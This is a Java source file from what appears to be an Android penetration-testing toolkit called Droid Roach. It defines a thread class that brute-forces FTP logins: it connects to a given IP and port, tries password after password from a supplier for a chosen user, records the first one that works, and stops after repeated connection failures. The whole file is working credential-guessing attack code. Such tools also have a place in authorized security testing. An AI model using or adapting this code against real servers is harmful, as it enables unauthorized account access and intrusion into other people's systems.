/*
 * This file is part of the Droid Roach project
 * Copyright 2013 Stefano Gabryel
 * Author: Stefano Gabryel
 * License: GPL v3 - http://www.gnu.org/licenses/gpl-3.0.html
 * Author website: http://www.stefano-workshop.com
 * Project website: http://droid-roach.stefano-workshop.com
 * 
 */

package esse.droidroach.module.ftpbruteforce.thread;

import esse.droidroach.module.ftpbruteforce.PasswordGetter;
import esse.droidroach.utility.FTPConnection;

public class BruteThread extends Thread {
	private PasswordGetter passwordGetter;
	private boolean isRunning=true;
	private String ip;
	private String user;
	private String port;
	private String passwordFound=null;
	private int connectFailCounter=0;
	private static final int CONNECTION_FAIL_LIMIT=8;
	private static final int FTP_CONNECTION_TIMEOUT=2000;
	private int loginTries=0;
	
	
	public BruteThread(PasswordGetter passwordGetter, String ip, String port, String user){
		this.passwordGetter=passwordGetter;
		this.ip=ip;
		this.user=user;
		this.port=port;
	}
	
	
	@Override
	public void run() {
		super.run();
		
		String password=passwordGetter.getNextPassword();
		
		while (password!=null && isRunning()){
			FTPConnection ftp = new FTPConnection(false);
			ftp.setTimeOut(FTP_CONNECTION_TIMEOUT);
			
			boolean loggedIn=false;
			
			
			try {
				
				if (ftp.connect(ip, Integer.parseInt(port))){
					loggedIn=ftp.login(user, password);
					loginTries++;	
				}
				
				ftp.disconnect();
			} catch (Exception e) {
				connectFailCounter++;
				if (connectFailCounter>=CONNECTION_FAIL_LIMIT)
					stopRunning();
			}
			
			if (loggedIn){
				passwordFound=password;
				stopRunning();
			}
			
			
			password=passwordGetter.getNextPassword();
			
			
			try {
				Thread.sleep(10);
			} catch (InterruptedException e) {

			}
			
		}
		
		
		
		stopRunning();
	}
	
	
	

	public int getLoginTries(){
		return loginTries;
	}
	
	public boolean isLockedOut(){
		if (connectFailCounter>=CONNECTION_FAIL_LIMIT)
			return true;
		
		return false;
	}

	public boolean isRunning() {
		return isRunning;
	}


	public void stopRunning() {
		this.isRunning = false;
	}
	
	public String getPasswordFound(){
		return passwordFound;
	}
	
	
	
	
	
	
	
	
	

}
